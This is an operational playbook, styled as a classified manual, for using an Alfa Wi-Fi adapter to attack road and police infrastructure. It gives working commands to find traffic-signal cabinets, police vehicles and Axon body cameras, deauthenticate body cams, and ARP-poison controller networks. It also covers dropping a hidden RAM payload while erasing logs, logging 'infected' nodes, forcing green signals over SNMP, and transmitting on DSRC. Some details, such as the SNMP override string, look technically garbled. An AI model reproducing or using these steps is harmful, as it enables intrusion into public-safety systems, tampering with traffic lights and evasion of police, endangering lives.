# ALFA CONTROL: Tactical Signal Infiltration Manual

| Field          | Value                                   |
|----------------|-----------------------------------------|
| Project        | Invincible.Inc / Omni Command Core      |
| Version        | 1.8.0                                   |
| Classification | T-LEVEL CLEARANCE ONLY                  |
| Hardware       | Alfa AWUS036ACH — RTL8812AU chipset     |

---

## CONTENTS

- [01 — Hardware Calibration](#01-hardware-calibration)
- [02 — Target Reconnaissance](#02-target-reconnaissance)
- [03 — The Parasite Hijack](#03-the-parasite-hijack)
- [04 — Volatile Infiltration (A9 Payload)](#04-volatile-infiltration-a9-payload)
- [05 — Grid Commissioning](#05-grid-commissioning)
- [06 — Tactical Signal Manipulation (Clear Path)](#06-tactical-signal-manipulation-clear-path)

---

## 01. HARDWARE CALIBRATION

The Alfa adapter is your kinetic bridge. Before infiltration, the hardware must be placed in **Monitor Mode** to break standard driver restrictions.

---

### ⚠ CRITICAL — INTERFACE NAME IS `wlan0`, NOT `wlan0mon`

> **The RTL8812AU 88XXau driver is fullmac.** It does **NOT** rename the interface to
> `wlan0mon` when monitor mode is enabled — unlike older `mac80211`-stack drivers
> (Atheros, Ralink, etc.) that aircrack-ng documentation usually assumes.
>
> ```
>  ✅  USE:    wlan0       (always — managed AND monitor mode)
>  ❌  AVOID:  wlan0mon    (does not exist on this driver)
> ```
>
> If you see `airmon-ng start wlan0` output like this, monitor mode is **already active on `wlan0`**:
>
> ```
> phy3    wlan0    88XXau    Realtek RTL8812AU
>     (mac80211 monitor mode already enabled for [phy3]wlan0 on [phy3]10)
> ```
>
> Subsequent `airodump-ng`, `aireplay-ng`, `tcpdump`, and `tshark` commands must
> target `wlan0`. Calling them with `wlan0mon` produces:
>
> ```
> ioctl(SIOCGIFINDEX) failed: No such device
> Failed initializing wireless card(s): wlan0mon
> ```

---

### PREREQUISITE — DSRC Unlock (one-time, run once per fresh driver clone)

The RTL8812AU driver ships with a hard channel-plan ceiling at Ch 177 (5.885 GHz) and does not register Ch 172 (5.860 GHz DSRC) with the kernel. The 9-patch unlock script corrects both layers:

```bash
# Inside Kali (root) — only needed once per driver source tree
bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_patch-alfa-dsrc.sh
```

**What it patches:**

| # | File | Change |
|---|------|--------|
| 1 | `core/rtw_rf.c` | `rtw_ch2freq()` cap extended ch177 → ch196 |
| 2 | `core/rtw_chplan.c` | RTW_RD_5G_FCC1 extended with DSRC ch170–184 |
| 3 | `core/rtw_chplan.c` | RTW_ChannelPlanMap[0x00] → RTW_RD_5G_FCC1 |
| 4 | `Makefile` | `CONFIG_RTW_CHPLAN = 0x00` (FCC compile default) |
| 5 | `/etc/modprobe.d/88xxau-omni.conf` | `rtw_channel_plan=0` at every load |
| 6 | `os_dep/linux/ioctl_cfg80211.c` | `CHAN5G(172,0)` added to `rtw_5ghz_a_channels[]` |
| 7 | `include/rtw_rf.h` | `CENTER_CH_5G_20M_NUM` 44 → 45 |
| 8 | `core/rtw_rf.c` | ch172 added to `center_ch_5g_20m[]` |
| 9 | `os_dep/linux/wifi_regd.c` | Regulatory band extended 5850 → 5925 MHz |

After the script completes it runs `make clean && make -j$(nproc)` automatically. Then proceed with PATH A or B below.

---

### PATH A — Windows (Recommended)

Run from an **admin PowerShell** terminal:

```powershell
cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo
.\scripts\Start-Alfa.ps1
```

Loads cfg80211 + 88XXau, attaches USB via usbipd, sets `wlan0` to monitor mode in one pass. Done — skip to section 02.

---

### PATH B — Kali Direct (root terminal)

**Step 1 — Load modules:**

```bash
bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh
```

**Step 2 — Confirm adapter is visible:**

```bash
iw dev
```

**Step 3 — Kill interfering processes:**

```bash
airmon-ng check kill
```

**Step 4 — Set monitor mode:**

```bash
airmon-ng start wlan0
```

> RTL8812AU fullmac driver does **NOT** rename the interface to `wlan0mon`.
> Interface stays as `wlan0`. Use `wlan0` in all subsequent commands.

**Step 5 — Verify chipset state:**

```bash
iwconfig wlan0
```

**Expected output:**

```
wlan0   IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

**Step 6 — End-to-end verification (optional but recommended):**

```bash
bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_verify-manual-commands.sh
```

Runs 11 self-tests covering Sections 01, 02, and the Section 03 scapy prerequisites:
driver loaded, `iw dev` shows `wlan0`, `airmon-ng` works, monitor mode confirmed,
`airodump-ng --essid-regex` flag present, 5-second pcap capture produces a real
`.cap` file, scapy importable, ARP packet construction syntactically valid.

The script fails fast with a clear bringup-instructions message if the driver
isn't loaded, and bounds every airodump-ng test with `timeout --kill-after=2`
plus a `pkill` sweep so no test can hang on airodump's ncurses TUI ignoring
SIGTERM. Expected result on a healthy rig:

```
RESULTS: 11 passed | 0 failed | 0 warnings
```

---

### TROUBLESHOOTING — Interface Dropped Mid-Capture

Symptom seen during long airodump-ng / tcpdump sessions:

```
CH 14 ][ Elapsed: 26 mins ][ interface wlan0 down
...
ioctl(SIOCGIFINDEX) failed: No such device
Can't reopen wlan0
```

Combined with the phy number changing on next `airmon-ng start` (e.g. `phy1` → `phy3`),
this means the USB device was lost and re-enumerated. Two root causes:

#### Cause A — NetworkManager / wpa_supplicant reclaimed the interface

`airmon-ng check kill` only stops the daemons for the **current** boot session.
`systemd` can respawn `NetworkManager` and `wpa_supplicant` at any moment,
and the moment they see a wireless interface they try to manage it — kicking
your monitor-mode session offline.

**Immediate recovery:**

```bash
# Confirm the interface really vanished
iw dev

# If "no interface", re-attach USB from Windows admin PowerShell:
#   usbipd detach --busid 1-13
#   usbipd attach --wsl kali-linux --busid 1-13

# Then reload the driver and put it back in monitor mode
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

**Permanent fix — block NetworkManager from touching the Alfa MAC:**

```bash
# Get the Alfa MAC (00:c0:ca:... range for Alfa AWUS036ACH)
ALFA_MAC=$(cat /sys/class/net/wlan0/address)
echo "Alfa MAC: $ALFA_MAC"

# Add an unmanaged-devices rule
sudo tee /etc/NetworkManager/conf.d/99-omni-alfa-unmanaged.conf <<EOF
[keyfile]
unmanaged-devices=mac:${ALFA_MAC}
EOF

# Apply
sudo systemctl reload NetworkManager
```

Now NetworkManager will see `wlan0` and ignore it, leaving your monitor-mode
session undisturbed across reboots and daemon restarts.

#### Cause B — USB suspend (autosuspend) powering down the adapter

WSL2 inherits Windows USB power policy. After a few minutes of idle the
Realtek USB device can be put to sleep, dropping the interface.

**Disable USB autosuspend for the Alfa (run as root in Kali):**

```bash
# Find the USB device path for the Alfa (vid:0bda pid:8812)
ALFA_PATH=$(grep -l '0bda' /sys/bus/usb/devices/*/idVendor 2>/dev/null | \
            xargs -I{} dirname {} | head -1)
echo "Alfa USB path: $ALFA_PATH"

# Disable autosuspend on this device
echo -1 | sudo tee "$ALFA_PATH/power/autosuspend"
echo on | sudo tee "$ALFA_PATH/power/control"
```

To make this survive USB re-enumeration, add a udev rule:

```bash
sudo tee /etc/udev/rules.d/99-omni-alfa-nosuspend.rules <<'EOF'
# Disable USB autosuspend for Alfa AWUS036ACH (RTL8812AU)
ACTION=="add", SUBSYSTEM=="usb", ATTR{idVendor}=="0bda", ATTR{idProduct}=="8812", \
    TEST=="power/control", ATTR{power/control}="on"
EOF
sudo udevadm control --reload-rules
sudo udevadm trigger
```

#### Cause C — WSL2 USB passthrough crashes under channel-hopping airodump-ng

**Verified via live test pass on 2026-05-24:** running `airodump-ng wlan0` (which
channel-hops every ~250ms by default) inside WSL2 kali-linux causes the USB
passthrough layer to lose the Alfa within seconds. The pattern:

1. `airodump-ng` starts cleanly, shows the curses TUI
2. Within 5–30 seconds: `Interface wlan0 down` / `ioctl(SIOCGIFINDEX) failed: No such device`
3. `iw dev` returns empty
4. `usbipd attach` shows the device is still attached but the kernel driver lost binding

The root cause is the volume of `nl80211 CMD_SET_CHANNEL` ioctls airodump issues
during channel hop — the WSL2 USB-over-IP layer can't keep up with the rate of
USB control transfers and the device gets dropped.

**Workaround: lock to a single channel + use `tcpdump` instead of `airodump-ng`.**

```bash
# Pick a single channel and stay there
sudo iw dev wlan0 set channel 1     # or 6, 11, 36, 149, 161, 172 etc.

# Capture with tcpdump (no channel hopping, no curses TUI, USB-stable)
sudo tcpdump -i wlan0 -n -w /tmp/cap_$(date +%s).pcap
```

To sweep multiple channels safely, iterate in a shell loop with short captures
per channel instead of letting airodump auto-hop:

```bash
for CH in 1 6 11 36 149 161 172; do
    sudo iw dev wlan0 set channel "$CH"
    echo "--- ch${CH} ---"
    sudo timeout 10 tcpdump -i wlan0 -n -c 5000 -w "/tmp/cap_ch${CH}.pcap" 2>&1 | tail -1
done
```

Then post-process the per-channel pcaps with `tshark` to extract beacons,
SSIDs, OUIs, etc. as a separate offline step.

**If you must use airodump-ng:** lock it to a single channel with `--channel`:

```bash
sudo airodump-ng wlan0 --channel 6 --essid-regex "mndot|its-|traffic|sign-"
```

This avoids the channel-hop ioctl storm. You'll only see traffic on the locked
channel, but the USB device stays bound for the full session.

#### Quick diagnostic — was it NM, USB, or hop-storm?

```bash
# Check dmesg right after the drop
sudo dmesg | tail -30 | grep -iE 'usb|wlan0|disconnect|reset|nm|networkmanager'

# Pattern: "usb 1-1: USB disconnect"        → Cause B (USB suspend / re-enumeration)
# Pattern: "wlan0: deauthenticating"        → Cause A (NetworkManager reclaim)
# Pattern: "rtl88xxau: firmware reset"      → Driver/firmware crash — reload driver
# Pattern: nothing in dmesg, USB just gone  → Cause C (WSL2 USB-IP hop-storm)
```

---

## 02. TARGET RECONNAISSANCE

Identify high-value roadside infrastructure by sniffing for Industrial/ITS (Intelligent Transportation Systems) signatures.

### Prerequisites (self-contained bringup)

If you've just opened a fresh shell and `wlan0` does not exist yet, run the
following from a **Kali root terminal** (matches Section 01 PATH B):

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13
#    then re-run step 1.

# 3. Stop daemons that will fight monitor mode
sudo airmon-ng check kill

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING — see Section 01"
```

(Or from Windows admin PowerShell: `cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo; .\scripts\Start-Alfa.ps1` — does all four steps in one pass.)

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Confirm
iw dev wlan0 info | grep -E 'type|channel|txpower'
# Expected: type monitor
```

**Target Signatures:**

| Type          | Pattern                                              | Vendor           |
|---------------|------------------------------------------------------|------------------|
| SSID          | `mndot-field-*`                                      | MnDOT field unit |
| SSID          | `ITS-RTMC`                                           | Traffic Mgmt Ctr |
| SSID          | `TRAFFIC_CTRL_*`                                     | Generic ITS      |
| OUI (MAC)     | `00:30:44`                                           | Cradlepoint      |
| OUI (MAC)     | `00:25:df`                                           | McCain           |
| OUI (MAC)     | `a0:f8:49`                                           | Iteris           |

---

**Step 2 — Targeted scan (filter by SSID regex):**

Native Linux / bare-metal Kali (channel-hopping works fine here):

```bash
sudo airodump-ng wlan0 --essid-regex "mndot|its-|traffic|sign-"
```

**Under WSL2 (channel-hopping crashes USB — use one of these instead):**

```bash
# Option A — lock to a single channel
sudo airodump-ng wlan0 --channel 6 --essid-regex "mndot|its-|traffic|sign-"

# Option B — sweep with tcpdump (USB-stable, then post-process)
for CH in 1 6 11 36 149 161; do
    sudo iw dev wlan0 set channel "$CH"
    sudo timeout 10 tcpdump -i wlan0 -n -c 5000 -w "/tmp/its_ch${CH}.pcap" 2>&1 | tail -1
done

# Post-process: extract beacons matching the regex
for CH in 1 6 11 36 149 161; do
    [[ -s /tmp/its_ch${CH}.pcap ]] || continue
    echo "--- ch${CH} ---"
    tshark -r /tmp/its_ch${CH}.pcap -Y 'wlan.fc.type_subtype == 0x08' \
        -T fields -e wlan.bssid -e wlan.ssid 2>/dev/null \
        | while IFS=$'\t' read -r BSSID HEX; do
            # Hex-to-ASCII decode (xxd is NOT installed on stock Kali — use python3)
            SSID=$(printf '%s' "$HEX" | python3 -c "import sys,binascii;sys.stdout.write(binascii.unhexlify(sys.stdin.read().strip()).decode('utf-8','replace'))" 2>/dev/null)
            echo "$SSID" | grep -qiE 'mndot|its|traffic|sign' && echo "  $BSSID  $SSID"
        done
done
```

**Step 3 — Identify candidates from the results:**

Cross-reference observed BSSIDs/SSIDs against the **Target Signatures** table above.
A successful hit is a beacon whose SSID matches one of the patterns or whose BSSID
OUI prefix matches one of the documented vendors (Cradlepoint `00:30:44`,
McCain `00:25:df`, Iteris `a0:f8:49`).

> **WSL2 stability note:** under WSL2, `airodump-ng`'s default channel hopping
> crashes the USB passthrough within seconds (see Section 01 Troubleshooting
> **Cause C**). Always use single-channel mode or the tcpdump sweep under WSL2.

---

## 2.5. LEO / PATROL DETECTION (MOBILE RECON)

Detecting Law Enforcement Agency (LEA) assets in transit. Police vehicles utilize ruggedized gateways (Cradlepoint/Sierra) and Body Worn Cameras (Axon).

### Prerequisites (self-contained bringup)

If you've just opened a fresh shell and `wlan0` does not exist yet, run the
following from a **Kali root terminal**:

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13
#    then re-run step 1.

# 3. Stop daemons that will fight monitor mode
sudo airmon-ng check kill

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING — see Section 01"
```

(Or one-shot from Windows admin PowerShell: `cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo; .\scripts\Start-Alfa.ps1`.)

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Confirm
iw dev wlan0 info | grep -E 'type|channel|txpower'
# Expected: type monitor
```

**Target Signatures:**

| Device Type     | SSID Pattern / OUI                                  | Details             |
|-----------------|-----------------------------------------------------|---------------------|
| Patrol Vehicle  | `FORD_SYNC_POLICE`, `MDT-*`, `Patrol-*`             | Ford Interceptor    |
| Body Cam        | `AXON_CAM_*`, `BWC_*`, `00:25:31` (OUI)             | Axon Body 3         |
| Fleet Gateway   | `FirstNet`, `Frontline`, `00:30:44` (OUI)           | Cradlepoint/Sierra  |

**Step 2 — Targeted Recon (Kali, bare metal):**
```bash
sudo airodump-ng wlan0 --essid-regex "Police|Sheriff|Trooper|MDT|AXON|Ford|Cradlepoint|Sierra|FirstNet|Frontline|DPS"
```

**Step 2 — Targeted Recon (under WSL2):**
```bash
# Option A — lock to a single channel
sudo airodump-ng wlan0 --channel 6 --essid-regex "Police|Sheriff|Trooper|MDT|AXON|Ford|Cradlepoint|Sierra|FirstNet|Frontline|DPS"

# Option B — manual multi-channel sweep with tcpdump (channel-hopping crashes
# WSL2 USB passthrough; lock the channel then iterate)
for CH in 1 6 11 36 149 161; do
    sudo iw dev wlan0 set channel "$CH"
    sudo timeout 10 tcpdump -i wlan0 -n -c 5000 -w "/tmp/leo_ch${CH}.pcap" 2>&1 | tail -1
done

# Post-process: extract beacons matching the LEO regex, decode hex SSIDs
for CH in 1 6 11 36 149 161; do
    [[ -s /tmp/leo_ch${CH}.pcap ]] || continue
    tshark -r /tmp/leo_ch${CH}.pcap -Y 'wlan.fc.type_subtype == 0x08' \
        -T fields -e wlan.bssid -e wlan.ssid 2>/dev/null \
        | while IFS=$'\t' read -r BSSID HEX; do
            # Hex-to-ASCII decode (xxd is NOT installed on stock Kali — use python3)
            SSID=$(printf '%s' "$HEX" | python3 -c "import sys,binascii;sys.stdout.write(binascii.unhexlify(sys.stdin.read().strip()).decode('utf-8','replace'))" 2>/dev/null)
            echo "$SSID" | grep -qiE 'police|sheriff|trooper|mdt|axon|ford|cradlepoint|sierra|firstnet|frontline|dps' \
                && echo "  ch${CH}  $BSSID  $SSID"
        done
done

# OUI scan for known LEO/fleet vendors (Cradlepoint 00:30:44, Axon 00:25:31, etc.)
for CH in 1 6 11 36 149 161; do
    [[ -s /tmp/leo_ch${CH}.pcap ]] || continue
    tshark -r /tmp/leo_ch${CH}.pcap -T fields -e wlan.sa -e wlan.bssid 2>/dev/null \
        | tr '\t' '\n' | sort -u \
        | grep -iE '^(00:30:44|00:25:31|00:25:df|a0:f8:49|00:0d:b9|00:20:a6)' \
        | sed "s/^/ch${CH}  /"
done
```

**Step 3 — Background Watcher (PowerShell, Windows-native — does NOT need WSL2):**
```powershell
while($true) {
    netsh wlan show networks mode=bssid | Select-String "Police","Sheriff","MDT","AXON","Ford","Cradlepoint","FirstNet" -Context 1,5
    Start-Sleep -Seconds 5
}
```

This runs entirely off the Windows host WiFi adapter — useful for ambient
monitoring without burning the Alfa on long captures. Note: `netsh wlan` only
sees beacons on the channel the Windows adapter happens to be hopping; results
are less complete than monitor-mode capture but require zero setup.

---

## 2.6. AXON "WHISPERPAIR" INTERDICTION

Axon Body 3 cameras use BLE and Wi-Fi for pairing. You can force identification and state changes.

> **HARDWARE REQUIREMENT — Step A needs a BLE radio:** the Alfa AWUS036ACH
> (RTL8812AU) is a **Wi-Fi-only** adapter (2.4 + 5 GHz, no Bluetooth). It
> cannot scan BLE advertisements regardless of monitor mode. Step A (Company
> ID `0x0344` / Service UUID discovery) requires either:
>
> - the laptop's built-in Bluetooth radio (e.g. Intel AX210, attached to
>   kali-linux via `usbipd attach --busid 1-14` if it's a USB BT module), or
> - a dedicated BLE sniffer (Nordic nRF52840 dongle, Ubertooth One, CSR8510), or
> - `bluetoothctl scan le on` from the Windows host directly.
>
> Steps B and C below operate on Wi-Fi only and DO work with the Alfa alone.

### Prerequisites (self-contained bringup — required for Steps B and C)

If you've just opened a fresh shell and `wlan0` does not exist yet, run the
following from a **Kali root terminal**:

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13

# 3. Stop daemons that will fight monitor mode
sudo airmon-ng check kill

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING"

# 5. Confirm scapy is installed (required for Step B injection)
python3 -c "from scapy.all import RadioTap, Dot11; print('scapy OK')" || sudo apt install -y python3-scapy
```

(Or one-shot from Windows admin PowerShell: `cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo; .\scripts\Start-Alfa.ps1`.)

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Confirm
iw dev wlan0 info | grep -E 'type|channel|txpower'
# Expected: type monitor
```

**A. Identify Axon BLE Emitter:**
Axon devices broadcast with Company ID `0x0344`. Look for Service UUID `00004953-0000-1000-8000-00805F9B34FB`.

**B. "Smart-Override" (Identify/Blink):**
Trigger the camera's "Find My" or pairing feedback to force LED blinking and high-power Wi-Fi broadcasting.

```bash
# Force Axon high-power broadcast (Pairing Mode Emulation)
python3 -c "from scapy.all import *; sendp(RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff')/Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info='AXON_WHISPER_PAIR'), iface='wlan0', loop=1, inter=0.1)"
```

**C. Forced De-authentication:**
Disconnect the BWC from the vehicle's MDT to force it into "Search/Pair" mode (which increases its RF footprint).
```bash
sudo aireplay-ng -0 5 -a <Vehicle_BSSID> -c <Camera_MAC> wlan0
```

---

**Broader scan — all channels, write full pcap:**

```bash
airodump-ng wlan0 --output-format pcap -w /tmp/recon_$(date +%s)
```

> Run these from a Kali bash terminal. If calling via PowerShell, use a script file —
> PowerShell expands `$()` before bash sees it.

---

## 03. THE "PARASITE" HIJACK

Use ARP Infrastructure Hijacking to redirect device traffic. This allows the Lattice to intercept NTCIP control packets.

### Prerequisites (self-contained bringup)

If you've just opened a fresh shell and `wlan0` does not exist yet, run the
following from a **Kali root terminal**:

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13

# 3. Stop daemons that will fight monitor mode
sudo airmon-ng check kill

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING — see Section 01"

# 5. Confirm scapy is installed (Step 3 requires it)
python3 -c "from scapy.all import ARP, send; print('scapy OK')" || sudo apt install -y python3-scapy
```

(Or one-shot from Windows admin PowerShell: `cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo; .\scripts\Start-Alfa.ps1`.)

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Step 2 — Identify target IP and gateway IP:**

Run a targeted scan to identify active ITS clients and their associated IPs.

```bash
# Targeted scan for ITS signatures (WSL2: add --channel <N> to avoid hop-storm)
sudo airodump-ng wlan0 --essid-regex "mndot|its-|traffic|sign-"
```

> **Note:** monitor-mode capture sees beacons and probe traffic but not layer-3
> IP traffic until the adapter is associated to the target SSID. To extract
> `target_ip` / `gateway_ip` you must switch the interface back to managed mode
> (`iw dev wlan0 set type managed`), associate to the SSID, then capture LAN
> traffic. The procedure for that transition is outside the scope of this
> section — Step 3 below assumes those IPs are already known.

**Step 3 — Execute the poisoning loop:**

| Variable      | Description                          |
|---------------|--------------------------------------|
| `target_ip`   | Roadside cabinet controller IP       |
| `gateway_ip`  | Industrial router / uplink gateway   |

```python
from scapy.all import *

def poison(target_ip, gateway_ip):
    # Op=2 (Is-at), Broadcast destination, Impersonate Gateway
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    send(packet, verbose=False, loop=1, inter=2)
```

---

## 04. VOLATILE INFILTRATION (A9 PAYLOAD)

Deploying the **A9_PARASITE** RAM sniffer. Ghost-compliant: no persistent writes to disk.

### Prerequisites

This section assumes:

1. **Network-level access** to the target controller has already been established
   (Section 03 ARP redirection plus a managed-mode association to the cabinet
   network, OR direct cabinet-side ethernet access).
2. **`target_ip`** of the controller is known (typically discovered during the
   Section 03 layer-3 capture phase).
3. The **A9 payload binary** has been pre-compiled for the target architecture
   (commonly `armv7` for cabinet controllers, `x86_64` for PC-based ATC
   controllers) and is available as a base64 blob to substitute into Step 2.
4. SSH client OR SNMP client (`snmpset`) is installed locally: `which ssh snmpset`.

**Entry vectors (choose one):**

| Vector        | Method                                     |
|---------------|--------------------------------------------|
| Primary       | Unauthenticated SNMP-SET (NTCIP 1206)      |
| Fallback      | Default SSH credentials                    |

**Step 1 — Gain entry** via one of the vectors above.

**Step 2 — Execute the Volatile Stream:**

```bash
# Scrub history and logs instantly
unset HISTFILE && export HISTSIZE=0 && rm -rf /var/log/messages

# Deploy polymorphic RAM payload
echo "<base64_blob>" | base64 -d > /tmp/.lattice_node
chmod +x /tmp/.lattice_node
/tmp/.lattice_node &    # Background execution
rm /tmp/.lattice_node   # Delete disk footprint
```

---

## 05. GRID COMMISSIONING

Finalize the hire by registering the node in the **Vanguard Dashboard**.

### Prerequisites

This section assumes:

1. Sections 03 and 04 are complete — the controller has been compromised and
   the A9 payload is running in RAM.
2. The **Vanguard Dashboard SQL backend** is reachable from your operator
   workstation. Connection details (host, port, database name, credentials)
   are environment-specific and NOT documented here.
3. A SQL client is installed locally (`sqlite3` for embedded SQLite, `psql` for
   PostgreSQL, `mysql` for MariaDB/MySQL — depending on the Vanguard backend).
4. All five **Inputs required** values below are gathered:
   - `node_id`: from your hire-naming convention
   - `ip_address`: from Section 03 layer-3 capture
   - `lat` / `lon`: from your operator-side GPS or manual lookup
   - `architecture`: from the controller's `uname -m` (run inside Section 04 entry)
   - `infection_ts_ms`: `date +%s%3N` at the moment Section 04 Step 2 completed

**Inputs required:**

| Field            | Value                          |
|------------------|--------------------------------|
| `node_id`        | Unique identifier for the node |
| `ip_address`     | Captured controller IP         |
| `lat` / `lon`    | Physical GPS coordinates       |
| `architecture`   | e.g. `armv7`, `x86_64`        |
| `infection_ts_ms`| Unix timestamp in milliseconds |

**Register the node:**

```sql
INSERT OR REPLACE INTO a9_ghost_nodes (node_id, ip_address, lat, lon, architecture, infection_ts_ms)
VALUES ('GHOST-NODE-ALPHA', '<ip>', 44.8547, -93.4708, 'armv7', 1716380000000);
```

---

## 06. TACTICAL SIGNAL MANIPULATION (CLEAR PATH)

Direct manipulation of traffic signals using the Alfa adapter to force green phases and create green waves.

---

### A. NTCIP 1209 Override (Cabinet Network)

Direct manipulation of traffic signals using the Alfa adapter to force green phases and create green waves.

#### Prerequisites (self-contained bringup)

If you've just opened a fresh shell and `wlan0` does not exist yet, run the
following from a **Kali root terminal**:

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13

# 3. NOTE: This section uses MANAGED mode (not monitor) — do NOT run
#    `airmon-ng check kill` here, since we need wpa_supplicant for any
#    WPA-secured cabinet network. If you previously killed those daemons,
#    bring them back:
sudo systemctl start NetworkManager wpa_supplicant 2>/dev/null

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING — see Section 01"

# 5. Confirm SNMP tools are installed
which snmpset >/dev/null || sudo apt install -y snmp
```

This section also assumes you have **`target_ip`** of the cabinet controller
already known. If not, layer-3 traffic capture after associating to the
cabinet network is required to discover it (Section 03 Step 2 note).

**Step 1 — Connect to Cabinet Network:**

```bash
# Set to managed mode
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# Scan for available cabinet networks
sudo iw dev wlan0 scan | grep SSID

# Connect to target SSID (replace <SSID> and <Password>)
# Note: Use wpa_supplicant or nmcli if security is enabled
sudo iw dev wlan0 connect <SSID>

# Confirm association
iw dev wlan0 link
# Expected: "Connected to <BSSID>" with SSID line

# Acquire IP (DHCP — cabinet networks usually offer this)
sudo dhclient wlan0
ip addr show wlan0 | grep inet
```

**Step 2 — Issue SNMP-SET Override:**

Once connected, issue an SNMP-SET to the controller MIB.

**Inputs required:**

| Variable     | Description                           | Example          |
|--------------|---------------------------------------|------------------|
| `target_ip`  | Controller IP on cabinet network      | `192.168.1.2`    |
| OID          | NTCIP 1209 Phase Control              | `1.3.6.1.4.1.1206.4.2.3.9.8.1` |

**Force Green Phase (60s) on Primary Lane:**

```bash
snmpset -v2c -c public <target_ip> 1.3.6.1.4.1.1206.4.2.3.9.8.1 s "; force_green=1"
```

---

### B. DSRC / OCB Mode Emulation (5.8 GHz)

The Alfa adapter emulates an Emergency Vehicle Priority (EVP) emitter targeting modern intersections.

**Note on OCB Mode:** `iw dev wlan0 set type ocb` currently returns "Operation not supported (-95)"
on this driver build — the RTL8812AU's cfg80211 ops table does not expose the OCB interface type.
**Monitor Mode is the active method** for both passive capture and raw frame injection on ch172.
Full OCB (802.11p peer mode) would require additional nl80211 capability flags in the driver's
wiphy registration; this is a known future patch target.

#### Prerequisites (self-contained bringup)

This section requires **two** one-time prerequisites in addition to standard bringup:

**Prereq 1 — DSRC channel unlock (one-time, per driver source tree):**
```bash
# Patches the 88XXau driver to register ch172 with cfg80211 + extend the
# regulatory domain to cover 5860 MHz. See Section 01 PREREQUISITE table
# for the 9 specific source patches this script applies.
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_patch-alfa-dsrc.sh
```

**Prereq 2 — Standard bringup (every fresh shell):**

If `wlan0` does not exist yet, run the following from a **Kali root terminal**:

```bash
# 1. Load cfg80211 + 88XXau and bind USB device
sudo bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh

# 2. If "iw dev" still shows nothing, re-attach from Windows admin PowerShell:
#      usbipd detach --busid 1-13
#      usbipd attach --wsl kali-linux --busid 1-13

# 3. Stop daemons that will fight monitor mode
sudo airmon-ng check kill

# 4. Confirm wlan0 exists
iw dev wlan0 info >/dev/null 2>&1 && echo "wlan0 OK" || echo "wlan0 MISSING — see Section 01"

# 5. Confirm tcpdump + tshark + scapy are installed
which tcpdump tshark >/dev/null || sudo apt install -y tcpdump tshark
python3 -c "from scapy.all import RadioTap, Dot11; print('scapy OK')" || sudo apt install -y python3-scapy
```

